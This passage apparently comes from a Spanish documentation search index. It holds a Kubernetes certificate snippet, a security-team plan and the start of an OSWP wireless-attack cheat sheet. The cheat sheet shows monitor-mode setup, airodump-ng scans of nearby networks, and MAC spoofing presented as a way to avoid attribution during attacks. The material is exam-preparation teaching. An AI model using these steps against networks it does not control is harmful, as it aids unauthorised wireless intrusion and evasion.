openssl","text":"<pre><code># 1. Extract the .key file from the .pfx file:\nopenssl pkcs12 -in pfx-filename.pfx -nocerts -out key-filename.key\n\n#2. Decrypt the .key file:\nopenssl rsa -in key-filename.key -out key-filename-decrypted.key\n\n# 3. Extract the .crt file from .pfx file:\nopenssl pkcs12 -in pfx-filename.pfx -clcerts -nokeys -out crt-filename.crt\n\n# 4. Create a secret in your Kubernetes cluster:\nkubectl create secret tls new-ssl-cert --cert crt-filename.crt --key key-filename-decrypted.key\n\n# 5. Verify that your new secret exists in your clusters namespace:\nkubectl get secret -n new-ssl-cert\n</code></pre>"},{"location":"Seguridad/Plan/","title":"Plan","text":"<p>La idea es que nosotros montemos nuestro departamento de Sec aqui en Europa</p> <p>tendremos oposici\u00f3n por parte de la otra parte del charco</p> <p>Juegos (CTF)</p> <p>Premios por el esfuerzo</p> <p>Modulos de formacion BTS (SecDevOps)</p> <p>Plantilla Framework \u00datil ()</p> <p>Adem\u00e1s evidentemente tendremos: - Aplicaciones - Docker - Equipos (Windows, Mac, Linux)</p> <p>Por \u00faltimo,  Los \"Juegos Olimpicos de BTS\" ya se nos ocurrir\u00e1 un nombre mejor. Que ser\u00e1n actividades o problemas para resolver en equipo, como un CFT, o un Red Team vs Blue Team</p> <p>Auditorias guiadas con tests.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/","title":"Preparaci\u00f3n para el OSWP (by s4vitar)","text":""},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#offensive-security-wireless-attacks-wifu-course-and-offensive-security-wireless-professional-oswp-cheat-sheet","title":"Offensive Security Wireless Attacks (WiFu) course and Offensive Security Wireless Professional (OSWP) Cheat Sheet","text":""},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#indice-y-estructura-principal","title":"\u00cdndice y Estructura Principal","text":"<ul> <li>Antecedentes - Experiencia Personal</li> <li>Estructura de los apuntes<ul> <li>Redes WPA</li> <li>Conceptos b\u00e1sicos</li> <li>Modo monitor</li> <li>Configuraci\u00f3n de la tarjeta de red y tips</li> <li>An\u00e1lisis del entorno</li> <li>Modos de filtro</li> <li>Exportaci\u00f3n de evidencias</li> <li>Concepto de Handshake</li> <li>T\u00e9cnicas para capturar un Handshake         * Ataque de Deautenticaci\u00f3n dirigido         * Ataque de Deautenticaci\u00f3n global (Broadcast MAC Address)         * Ataque de Autenticaci\u00f3n         * CTS Frame Attack - Secuestro del Ancho de Banda         * Beacon Flood Mode Attack         * Disassociation Amok Mode Attack         * Michael Shutdown Exploitation         * T\u00e9cnicas pasivas<ul> <li>Validaci\u00f3n del Handshake con Pyrit</li> <li>Tratamiento y filtro de la captura</li> <li>Parseador para redes del entorno</li> <li>An\u00e1lisis de paquetes de red con Tshark</li> <li>Extracci\u00f3n del hash en el Handshake</li> <li>Fuerza bruta con John</li> <li>Fuerza bruta con Aircrack</li> <li>Fuerza bruta con Hashcat</li> <li>Proceso de ataque con Bettercap</li> <li>T\u00e9cnicas de aumento de la velocidad de c\u00f3mputo<ul> <li>Concepto de Rainbow Table</li> <li>Cracking con Pyrit</li> <li>Cracking con Cowpatty</li> <li>Cracking con Airolib</li> <li>Rainbow Table con GenPMK</li> <li>Cracking con Cowpatty frente a Rainbow Table</li> <li>Cracking con Pyrit frente a Rainbow Table</li> <li>Cracking con Pyrit a trav\u00e9s de ataque por base de datos</li> </ul> </li> <li>T\u00e9cnicas de espionaje<ul> <li>Uso de Airdecap para el desencriptado de paquetes</li> <li>An\u00e1lisis del desencriptado con Tshark y Wireshark</li> <li>Espionaje con Ettercap Driftnet y enrutamiento con iptables</li> </ul> </li> <li>Ataques graciosos<ul> <li>Reemplazado de im\u00e1genes web</li> <li>Ataque Shaking Web</li> </ul> </li> <li>Evil Twin Attack</li> <li>Creaci\u00f3n de fichero DHCP</li> <li>Configuraci\u00f3n de p\u00e1gina web</li> <li>Inicializaci\u00f3n de servicios</li> <li>Creaci\u00f3n de base de datos via MYSQL</li> <li>Creaci\u00f3n de falso punto de acceso via Airbase</li> <li>Creaci\u00f3n de interfaz y asignaci\u00f3n de segmentos</li> <li>Control y creaci\u00f3n de reglas de enrutamiento por iptables</li> <li>Sincronizaci\u00f3n de reglas definidas con el Fake AP</li> <li>Robo de datos</li> <li>Ataque a redes sin clientes<ul> <li>Clientless PKMID Attack<ul> <li>Ataque desde Bettercap</li> <li>Ataque via hcxdumptool</li> <li>Uso de hcxpcaptool</li> </ul> </li> </ul> </li> <li>Ataques por WPS<ul> <li>Uso de Wifimosys</li> </ul> </li> <li>Redes WPA Ocultas </li> </ul> </li> <li>Redes WEP<ul> <li>Fake Authentication Attack </li> <li>ARP Replay Attack </li> <li>Chop Chop Attack </li> <li>Fragmentation Attack </li> <li>SKA Type Cracking </li> </ul> </li> </ul> </li> </ul>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#antecedentes","title":"Antecedentes","text":"<p>Antes que nada me gustar\u00eda comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le sirva de inspiraci\u00f3n para aquel que pretenda sacarse la certificaci\u00f3n.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#es-dificil-la-certificacion","title":"\u00bfEs dif\u00edcil la certificaci\u00f3n?","text":"<p>A diferencia del OSCP, encontr\u00e9 bastante sencillo el curso, pero todo tiene su explicaci\u00f3n. </p> <p>Cuando empec\u00e9 con el Hacking, lo primero que toqu\u00e9 fue la parte WiFi, por lo que esta parte la ten\u00eda m\u00e1s que controlada antes de empezar. En cuanto a aprendizaje, aprend\u00ed una o dos cosas nuevas, lo cual es excitante, pero a groso modo os puedo decir que por mi cuenta de manera autodidacta abarqu\u00e9 mucho m\u00e1s temario del que presentaba el curso.</p> <p>Por ello hago este Gist, no s\u00f3lo para comentar las t\u00e9cnicas que necesit\u00e1is tener controladas, sino para ense\u00f1aros un par de trucos y vectores de ataque que no est\u00e1n de m\u00e1s guardarlos bajo la manga.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#que-plan-me-pillo","title":"\u00bfQu\u00e9 plan me pillo?","text":"<p>En mi caso me pill\u00e9 un mes de curso, pero al tercer d\u00eda de pagarlo me present\u00e9 al examen. Para aquellos que no est\u00e9n experimentados con la tem\u00e1tica WiFi, os puedo decir que con un mes ten\u00e9is de sobra, ya que no requiere tanta dedicaci\u00f3n como el OSCP.</p> <p>Eso s\u00ed, hay multitud de comandos y distintos casos, por lo que sobra decir que practicar siempre hay que practicar. </p> <p>En este caso el curso no dispone de laboratorio, por lo que ser\u00e1 necesario montarse un laboratorio en local donde practicar los distintos casos. Para los interesados, todos los laboratorios los mont\u00e9 con un 'TP-Link', un simple repetidor desde el cual pod\u00eda configurar si la red quer\u00eda que fuera de protocolo WPA o de protocolo WEP con sus distintos modos de autenticaci\u00f3n.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#que-bases-tuve-antes-de-comenzar-con-la-certificacion","title":"\u00bfQu\u00e9 bases tuve antes de comenzar con la certificaci\u00f3n?","text":"<p>Como dije anteriormente, ten\u00eda altamente controlada la parte WiFi, por lo que el estudio de los ataques a redes WPA y WEP no supuso ning\u00fan problema. La gu\u00eda que te entregan junto a los v\u00eddeos est\u00e1n perfectamente estructurados, y cuentas con todo lo necesario para enfrentarte al examen.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#que-pasos-me-recomiendas-para-abordar-con-exito-la-certificacion","title":"\u00bfQu\u00e9 pasos me recomiendas para abordar con \u00e9xito la certificaci\u00f3n?","text":"<p>Recomiendo montar un laboratorio en local para practicar todos los vectores de ataque vistos durante el curso.</p> <p>Para abordar con \u00e9xito la certificaci\u00f3n, es necesario que sepas al dedillo c\u00f3mo manejarte en las siguientes situaciones, siguiendo como objetivo obtener la contrase\u00f1a del punto de acceso inal\u00e1mbrico:</p> <ul> <li>Ataques a redes WPA con autenticaci\u00f3n PSK</li> <li>Ataques a redes WEP con clientes sin autenticaci\u00f3n SKA</li> <li>Ataques a redes WEP con clientes y autenticaci\u00f3n SKA</li> <li>Ataques a redes WEP sin clientes</li> </ul> <p>Ahora bien, para cada caso, hay distintas formas de efectuar el procedimiento, ya que depende a su vez del tr\u00e1fico de la red, la calidad de los paquetes capturados y distintos factores.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#como-esta-estructurado-el-examen","title":"\u00bfC\u00f3mo est\u00e1 estructurado el examen?","text":"<p>El examen tiene una duraci\u00f3n de cuatro horas, te conectas a una m\u00e1quina por VPN la cual dispone de una tarjeta de red configurada y a partir de ah\u00ed escaneas el entorno.</p> <p>En el entorno, hay un total de tres puntos de acceso que debes vulnerar, cada uno de ellos representando un caso diferente. Para aprobar el examen, debes averiguar la contrase\u00f1a de los tres AP's, pues en caso contrario no te aprueban.</p> <p>La gran pregunta, \u00bfson cuatro horas suficientes?, mi respuesta es m\u00e1s que suficiente. En mi caso en una media hora aproximada ya hab\u00eda terminado el examen (lo cual me sorprendi\u00f3). Recomiendo tener todos los comandos apuntados para cada caso, eso os permitir\u00e1 ir a tiro hecho.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#tuve-problemas-a-la-hora-de-practicar-con-el-laboratorio-en-local","title":"\u00bfTuve problemas a la hora de practicar con el laboratorio en local?","text":"<p>Como dije anteriormente, esta certificaci\u00f3n no dispone de laboratorio, lo que te obliga a montarte tu propio laboratorio en local para practicar.</p> <p>Los \u00fanicos ataques que no pude replicar fueron el Chop Chop de Korek y el Fragmentation Attack, empleado para redes que no disponen de clientes asociados. Este mismo problema lo he visto en m\u00e1s gente, leyendo en art\u00edculos donde detallaban el mismo inconveniente. Al parecer depende del modelo de router que tengas. </p> <p>En la web de Offensive se cita el modelo a usar para practicar los vectores de ataque, pero como comprender\u00e9is, no iba a gastar dinero por poder hacer dos ataques. Por lo dem\u00e1s, el resto de ataque los pude replicar correctamente.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#cuales-son-los-siguientes-pasos","title":"\u00bfCu\u00e1les son los siguientes pasos?","text":"<p>La siguiente certificaci\u00f3n que me estoy preparando es el eWPT, una certificaci\u00f3n de Pentesting Web bastante valorada y orientada a Bug Bounty. Si me animo puede que mate dos p\u00e1jaros de un tiro y tras tenerla pruebe a hacer el AWAE de Offensive Security, ya que estar\u00e9 bien fresco de ideas una vez finalice el otro.</p> <p>Por si os interesa, el eWPT dispone de un plan (que es el que he pagado) que os permite tener un laboratorio de m\u00e1quinas de por vida sobre los que practicar Pentesting Web, el cual os actualizan frecuentemente.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#estructura-de-los-apuntes","title":"Estructura de los apuntes","text":"<p>Para facilitar la repartici\u00f3n de apuntes, intuyo que es buena idea dividirlo por un lado en ataques a redes WPA y por otro lado en ataques a redes WEP con sus distintos casos, \u00a1as\u00ed que as\u00ed lo haremos Mike!</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#redes-wpa","title":"Redes WPA","text":"<p>Este apartado engloba todos los vectores de ataque y t\u00e9cnicas ofensivas destinadas al protocolo WPA.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#conceptos-basicos","title":"Conceptos b\u00e1sicos","text":"<p>Hay que aclarar una serie de conceptos clave antes de empezar. La mayor\u00eda de los ataques que vamos a ver, adem\u00e1s de en ocasiones servir para molestar... van destinados a obtener la contrase\u00f1a de una red inal\u00e1mbrica.</p> <p>El por qu\u00e9 es necesario realizar un ataque para obtener la contrase\u00f1a es algo que veremos en los siguientes puntos. Hay que tener en cuenta que al tratarse de una autenticaci\u00f3n de tipo PSK (Pre-Shared-Key), se est\u00e1 haciendo uso de una clave pre-compartida como su nombre indica, una contrase\u00f1a \u00fanica que de estar a disposici\u00f3n de cualquiera puede ser usada para llevar a cabo una asociaci\u00f3n contra el AP.</p> <p>A la hora de llevar a cabo una asociaci\u00f3n por una estaci\u00f3n (cliente) contra el AP, se deja un rastro a nivel de paquetes (eapol), los cuales como atacante, pueden ser capturados y tratados sin estar autenticados al punto de acceso para posteriormente extraer la contrase\u00f1a de la red inal\u00e1mbrica.</p> <p>Todo esto explicado de una manera no t\u00e9cnica para no entrar en materia tan r\u00e1pido, ya a medida que vayamos avanzando se ir\u00e1 analizando mas a bajo nivel c\u00f3mo funciona todo :)</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#modo-monitor","title":"Modo monitor","text":"<p>Hay que pensar que estamos rodeados de paquetes por todos lados, paquetes que no somos capaces de percibir, paquetes que contienen informaci\u00f3n del entorno por el que nos movemos. </p> <p>Estos paquetes pueden ser capturados con tarjetas de red que acepten el modo monitor. El modo monitor, no es m\u00e1s que un modo por el cual podemos escuchar y capturar todos los paquetes que viajen por el aire. Tal vez lo mejor de todo es que no s\u00f3lo podemos capturarlos, sino tambi\u00e9n manipularlos (veremos algunos ataques interesantes m\u00e1s adelante).</p> <p>Para comprobar si nuestra tarjeta de red acepta el modo monitor, haremos una prueba en el siguiente apartado.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#configuracion-de-la-tarjeta-de-red-y-tips","title":"Configuraci\u00f3n de la tarjeta de red y tips","text":"<p>Empecemos con un par de comandos b\u00e1sicos. A continuaci\u00f3n os listo mi tarjeta de red:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #ifconfig wlan0\nwlan0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 192.168.1.187  netmask 255.255.255.0  broadcast 192.168.1.255\n        inet6 fe80::1d28:6b2b:a941:5796  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether e4:70:b8:d3:93:5d  txqueuelen 1000  (Ethernet)\n        RX packets 6426576  bytes 9229384163 (8.5 GiB)\n        RX errors 0  dropped 5  overruns 0  frame 0\n        TX packets 1160899  bytes 162727829 (155.1 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre> <p>Espero que a partir de ahora os llev\u00e9is bien con ella, pues con esta practicaremos la mayor\u00eda de ataques.</p> <p>Para poner en modo monitor nuestra tarjeta de red, es tan simple como aplicar el siguiente comando:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #airmon-ng start wlan0\n\nFound 5 processes that could cause trouble.\nKill them using 'airmon-ng check kill' before putting\nthe card in monitor mode, they will interfere by changing channels\nand sometimes putting the interface back in managed mode\n\n  PID Name\n  818 avahi-daemon\n  835 wpa_supplicant\n  877 avahi-daemon\n 5398 NetworkManager\n18308 dhclient\n\nPHY Interface   Driver      Chipset\n\nphy0    wlan0       iwlwifi     Intel Corporation Wireless 7265 (rev 61)\n\n        (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)\n        (mac80211 station mode vif disabled for [phy0]wlan0)\n</code></pre> <p>Ahora bien, cosas a tener en cuenta. Cuando estamos en modo monitor, perdemos conectividad a internet. Este modo no admite conexi\u00f3n a internet, por lo que no os asust\u00e9is si de pronto veis que no pod\u00e9is navegar. Veremos c\u00f3mo deshabilitar este modo para que todo vuelva a la normalidad.</p> <p>Cabe decir que al iniciar este modo, se generan una serie de procesos conflictivos. Esto es as\u00ed dado que por ejemplo, si no vamos a tener acceso a internet... \u00bfpor qu\u00e9 tener corriendo los procesos 'dhclient' y 'wpa_supplicant'?, es algo absurdo, e incluso la propia suite nos lo recuerda... pues se encargan de darnos conectividad y mantenernos con conexi\u00f3n en una red ya estando asociados, lo cual en este caso... no aplica.</p> <p>Matar estos procesos es sencillo, tenemos la siguiente forma:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #pkill dhclient &amp;&amp; pkill wpa_supplicant\n</code></pre> <p>O si deseamos tirar de la propia suite:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #airmon-ng check kill\n\nKilling these processes:\n\n  PID Name\n  835 wpa_supplicant\n</code></pre> <p>Ya con esto, nuestra tarjeta de red est\u00e1 en modo monitor. Una forma de comprobar si estamos en modo monitor es listando nuestras interfaces de red. Ahora nuestra red wlan0 deber\u00eda llamarse wlan0mon:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #ifconfig | grep wlan0 -A 6\nwlan0mon: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        unspec E4-70-B8-D3-93-5C-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)\n        RX packets 63  bytes 12032 (11.7 KiB)\n        RX errors 0  dropped 63  overruns 0  frame 0\n        TX packets 0  bytes 0 (0.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre> <p>Una vez llegados a este punto, se podr\u00eda decir que ya somos capaces de capturar todos los paquetes que viajan por nuestro alrededor, pero dejaremos esto para el siguiente punto.</p> <p>Importante, \u00bfc\u00f3mo desactivar el modo monitor y hacer que todo vuelva a la normalidad en t\u00e9rminos de conectividad?, sencillo. Podemos hacer uso de los siguientes comandos para restablecer la conexi\u00f3n:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #airmon-ng stop wlan0mon &amp;&amp; service network-manager restart\n\nPHY Interface   Driver      Chipset\n\nphy0    wlan0mon    iwlwifi     Intel Corporation Wireless 7265 (rev 61)\n\n        (mac80211 station mode vif enabled on [phy0]wlan0)\n\n        (mac80211 monitor mode vif disabled for [phy0]wlan0mon)\n\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #ping -c 10 -i 0.01 -q google.es\nPING google.es (172.217.17.3) 56(84) bytes of data.\n\n--- google.es ping statistics ---\n10 packets transmitted, 10 received, 0% packet loss, time 309ms\nrtt min/avg/max/mdev = 28.718/29.565/29.985/0.427 ms, pipe 3\n</code></pre> <p>Por lo que fuera malestares y preocupaciones, no hay que tirar el ordenador a la basura. </p> <p>Pero esto no es suficiente. A pesar de no estar conectados a ninguna red y no disponer de direccion IP, lo que en s\u00ed puede dejar rastro es nuestra direcci\u00f3n MAC. </p> <p>La direcci\u00f3n MAC al fin y al cabo es como el DNI de cada dispositivo, es lo que identifica un dispositivo m\u00f3vil, un router, un ordenador, etc. Ser\u00eda feo estar haciendo cierto tipo de ataques actuando bajo una direcci\u00f3n MAC que se nos asocie, es lo equivalente a hacer un atraco con pasamonta\u00f1as pero llevar una cartera con nuestro DNI dentro del bolsillo y que en un descuido se nos caiga al suelo quedando a la exposici\u00f3n de todos los dem\u00e1s.</p> <p>Una buena practica consiste en falsificar la direcci\u00f3n MAC, y no hace falta saber de electr\u00f3nica o Hardware para ello. A trav\u00e9s de la utilidad macchanger, podemos jugar con la direcci\u00f3n MAC de nuestro dispositivo para manipularla a nuestro antojo.</p> <p>Por ejemplo, imaginemos que quiero asignar a mi tarjeta de red una direcci\u00f3n MAC de la NATIONAL SECURITY AGENCY (NSA), \u00bfc\u00f3mo se proceder\u00eda?. Primero buscamos la direcci\u00f3n MAC en el amplio listado del que dispone 'macchanger':</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #macchanger -l | grep -i \"national security agency\"\n8310 - 00:20:91 - J125, NATIONAL SECURITY AGENCY\n</code></pre> <p>Estos tres primeros pares listados corresponden a lo que se conoce como Organizationally Unique Identifier, un simple n\u00famero de 24 bits que identifica al vendor, manufacturer u otra organizaci\u00f3n.</p> <p>Una direcci\u00f3n MAC est\u00e1 compuesta por 6 bytes, ya tenemos los primeros 3 bytes, \u00bfqu\u00e9 hay de los otros 3 bytes?. Los 24 bits restantes corresponden a lo que se conoce como Universally Administered Address, y sinceramente... en mis pr\u00e1cticas, siempre me la invento.</p> <p>Es decir, que si quisiera falsificar una direcci\u00f3n MAC registrada bajo el OUI de la NSA, podr\u00eda hacer lo siguiente:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #ifconfig wlan0mon down\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #echo \"$(macchanger -l | grep -i \"national security agency\" | awk '{print $3}'):da:1b:6a\"\n00:20:91:da:1b:6a\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #macchanger --mac=$(!!) wlan0mon\nCurrent MAC:   e4:70:b8:d3:93:5c (unknown)\nPermanent MAC: e4:70:b8:d3:93:5c (unknown)\nNew MAC:       00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #ifconfig wlan0mon up\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #macchanger -s wlan0mon\nCurrent MAC:   00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)\nPermanent MAC: e4:70:b8:d3:93:5c (unknown)\n</code></pre> <p>Aspectos a tener en cuenta de lo anterior:</p> <ul> <li> <p>Es necesario dar de baja la interfaz de red para manipular su direcci\u00f3n MAC, pues de lo contrario el propio   'macchanger' nos avisar\u00e1 de que es necesario darla de baja.</p> </li> <li> <p>Con la utilidad '--mac', podemos especificar la direcci\u00f3n MAC a utilizar para la interfaz de red   especificada.</p> </li> <li> <p>Una vez aplicados los cambios, damos de alta la interfaz y con el par\u00e1metro '-s' (show), validamos que   nuestra tarjeta de red corresponde al OUI asignado.</p> </li> </ul> <p>Perfecto, si has llegado a este punto podemos continuar.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#analisis-del-entorno","title":"An\u00e1lisis del entorno","text":"<p>Llega el momento interesante. Ahora que estamos en modo monitor, para capturar todos los paquetes de nuestro alrededor, podemos hacer uso del siguiente comando:</p> <pre><code>airodump-ng wlan0mon\n</code></pre> <p>IMPORTANTE: Aunque tal vez lo deber\u00eda haber mencionado en el anterior punto, no todas las tarjetas de red tienen por qu\u00e9 llamarse wlan0, pueden tener un nombre distinto (Ej: wlp2s0), por lo que habr\u00e1 que tener en cuenta su nombre para acompa\u00f1arlo junto al comando a aplicar.</p> <p>Al correr el comando citado anteriormente, obtenemos el siguiente resultado:</p> <pre><code> CH 13 ][ Elapsed: 18 s ][ 2019-08-05 13:34                                         \n\n BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n 20:34:FB:B1:C5:53  -20       19        1    0   1  180  WPA2 CCMP   PSK  hacklab                                                                                                      \n 1C:B0:44:D4:16:78  -59       23       13    0  11  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                                \n 30:D3:2D:58:3C:6B  -79       29        4    0  11  135  WPA2 CCMP   PSK  devolo-30d32d583c6b                                                                                          \n 10:62:D0:F6:F7:D8  -81       15        0    0   6  130  WPA2 CCMP   PSK  LowiF7D3                                                                                                     \n F8:8E:85:DF:3E:13  -85       14        0    0   9  130  WPA  CCMP   PSK  Wlan1                                                                                                        \n FC:B4:E6:99:A9:09  -85       17        0    0   1  130  WPA2 CCMP   PSK  MOVISTAR_A908                                                                                                \n 28:9E:FC:0C:40:3E  -90        2        0    0   6  195  WPA2 CCMP   PSK  vodafone4038                                                                                                 \n\n BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             \n\n 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -27    0 - 2e     0        1                                \n</code></pre> <p>Entonces bien, \u00bfc\u00f3mo se interpreta este output?. </p> <p>De los campos m\u00e1s importantes por el momento, por un lado tenemos el campo BSSID, donde siempre podremos corroborar cu\u00e1l es la direcci\u00f3n MAC del punto de acceso. Por otro lado, contamos con el campo PWR, donde a modo de consideraci\u00f3n, a m\u00e1s cerca est\u00e9 del valor 0, podremos decir que m\u00e1s cerca nos situamos del AP.</p> <p>El campo CH, indica el canal en el que se sit\u00faa el AP. Cada AP, est\u00e1 posicionado en un canal distinto, con el objetivo de evitar que se da\u00f1e el espectro de onda entre las m\u00faltiples redes del entorno. Existe un ataque justamente de denegaci\u00f3n de servicio, que se encarga de generar m\u00faltiples Fake AP's situados en el mismo canal que en el del AP objetivo, consiguiendo as\u00ed que la red queda inoperativa temporalmente (lo veremos m\u00e1s adelante).</p> <p>Por otro lado, los campos ENC, CIPHER y AUTH, donde podremos comprobar siempre con qu\u00e9 tipo de red estamos tratando. La mayor\u00eda de redes dom\u00e9sticas cumplen la encriptaci\u00f3n WPA/WPA, con cifrado CCMP y modo de autenticaci\u00f3n PSK.</p> <p>En el campo ESSID, podremos siempre saber el nombre de la red con la que estamos tratando, pudiendo as\u00ed en una misma l\u00ednea a trav\u00e9s del campo BSSID saber cu\u00e1l es su direcci\u00f3n MAC, de utilidad para cuando comencemos con la fase de filtrado.</p> <p>El campo DATA, por el momento no lo tocaremos, ya que nos meteremos a fondo con este cuando tratemos las redes de protocolo WEP. </p> <p>Asimismo, en la parte inferior, podemos ver otros datos que est\u00e1n siendo capturados con la herramienta. Esta secci\u00f3n corresponde a la de los clientes. Consideraremos una estaci\u00f3n como un cliente asociado. Para el ejemplo mostrado, existe una estaci\u00f3n con direcci\u00f3n MAC 34:41:5D:46:D1:38 asociado al BSSID '20:34:FB:B1:C5:53', donde de manera inmediata en la parte superior podemos ver que se trata de la red hacklab, por lo que ya sabemos que dicha red cuenta con un cliente asociado.</p> <p>Es posible que en ocasiones lleguemos a capturar estaciones que no est\u00e1n asociadas a ning\u00fan punto de acceso, el cual en este caso se indicar\u00e1 con un 'not associated' en el campo BSSID. Es a trav\u00e9s del campo Frames de las estaciones, donde podremos ver qu\u00e9 tipo de actividad tiene el cliente sobre dicho AP. Si los Frames aumentan considerablemente a intervalos cortos de tiempo, esto quiere decir que la estaci\u00f3n se encuentra activa en el momento de la captura.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#modos-de-filtro","title":"Modos de filtro","text":"<p>Aunque es una maravilla poder capturar todos los AP's y estaciones de nuestro entorno, como atacante siempre nos interesar\u00e1 atentar contra un AP espec\u00edfico. Por ello, introducimos en este punto los modos de filtro disponibles desde la herramienta para capturar aquellos puntos de acceso deseados.</p> <p>Volvamos al caso de antes:</p> <pre><code> CH 13 ][ Elapsed: 18 s ][ 2019-08-05 13:34                                         \n\n BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n 20:34:FB:B1:C5:53  -20       19        1    0   1  180  WPA2 CCMP   PSK  hacklab                                                                                                      \n 1C:B0:44:D4:16:78  -59       23       13    0  11  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                                \n 30:D3:2D:58:3C:6B  -79       29        4    0  11  135  WPA2 CCMP   PSK  devolo-30d32d583c6b                                                                                          \n 10:62:D0:F6:F7:D8  -81       15        0    0   6  130  WPA2 CCMP   PSK  LowiF7D3                                                                                                     \n F8:8E:85:DF:3E:13  -85       14        0    0   9  130  WPA  CCMP   PSK  Wlan1                                                                                                        \n FC:B4:E6:99:A9:09  -85       17        0    0   1  130  WPA2 CCMP   PSK  MOVISTAR_A908                                                                                                \n 28:9E:FC:0C:40:3E  -90        2        0    0   6  195  WPA2 CCMP   PSK  vodafone4038                                                                                                 \n\n BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             \n\n 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -27    0 - 2e     0        1  \n ```\n\n Imaginemos que queremos filtrar para que s\u00f3lo se lista el punto de acceso cuyo **ESSID** es **hacklab**, \u00bfqu\u00e9\n podemos recaudar de primeras de esta red?\n\n * El AP se sit\u00faa en el canal 1\n * El AP posee direcci\u00f3n MAC  20:34:FB:B1:C5:53\n * El AP posee ESSID hacklab\n\nGeneralmente con 2 datos ya es suficiente para llevar a cabo el filtro. Para este caso, podr\u00edamos filtrar la\nred en cuesti\u00f3n de las siguientes formas:\n\n* airodump-ng -c 1 --essid hacklab wlan0mon\n* airodump-ng -c 1 --bssid  20:34:FB:B1:C5:53 wlan0mon\n* airodump-ng -c 1 --bssid  20:34:FB:B1:C5:53 --essid hacklab wlan0mon\n\nPara cualquiera de las formas representadas, obtendr\u00edamos los siguientes resultados:\n\n```bash\n CH  1 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         \n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n 20:34:FB:B1:C5:53  -26 100       29        7    3   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  \n\n BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             \n\n 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -26    0e- 6e     0        9                 \n</code></pre>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#exportacion-de-evidencias","title":"Exportaci\u00f3n de evidencias","text":"<p>Ahora bien, a efectos pr\u00e1cticos, nos encontramos en la misma situaci\u00f3n que al principio. Como atacantes, lo que nos interesa siempre es recolectar la informaci\u00f3n del AP objetivo. En este caso, estamos monitorizando el tr\u00e1fico del AP hacklab, pero sin generar evidencias.</p> <p>Resulta m\u00e1s interesante capturar y exportar todo el tr\u00e1fico que se monitorea a un fichero, con el prop\u00f3sito de posteriormente poder analizarlo. Para ello se hace uso de la misma sintaxis pero incorporando el par\u00e1metro '-w', donde seguidamente especificamos el nombre del fichero:</p> <ul> 